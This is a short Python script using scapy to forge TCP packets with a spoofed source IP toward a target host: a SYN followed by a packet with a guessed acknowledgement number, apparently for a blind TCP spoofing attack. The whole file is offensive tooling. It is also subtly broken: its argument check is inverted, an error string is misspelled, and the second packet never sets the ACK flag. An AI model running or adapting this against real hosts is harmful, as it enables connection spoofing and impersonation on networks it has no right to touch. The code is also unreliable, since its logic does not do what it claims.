from scapy.all import *
from custom_modules.ConsoleMessenger import CONSOLE_MESSENGER_SWITCH as cms

""" 
    src:    192.168.1.212       Spoof IP 
    tgt:    192.168.1.1         Target IP 
    ack:    2024371201          SeqNum 
    call:   spoof_conn(src,tgt,ack) 
"""


def spoof_conn(src=None, tgt=None, ack=None, sport=None, dport=None):
    results = args_valid(src, tgt, ack, sport, dport)
    status = results["status"]
    cus = cms["custom"]

    if status:
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=dport)
        syn_pkt = ip_layer / tcp_layer

        send(syn_pkt)

        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=dport, ack=ack)
        ack_pkt = ip_layer / tcp_layer

        send(ack_pkt)
    else:
        errors = results["errors"]
        line = ""

        for i, e in enumerate(errors):
            if i < (len(errors) - 1):
                line += "{}\t".format(e)
            else:
                line += "{}".format(e)

        e = cus(255, 65, 65, "Error:")
        msg = cus(255, 255, 255, "Expected 5 arguments but received [{}]".format(line))
        e_msg = "{}\t{}".format(e, msg)
        raise ValueError(e_msg)


def args_valid(*args):
    errors = []

    for a in args:
        if a == None:
            errors.append({"{}".format(a): "Nonne"})
        else:
            continue

    if len(errors) > 0:
        return {"status": True}
    else:
        return {"status": False, "errors": errors}
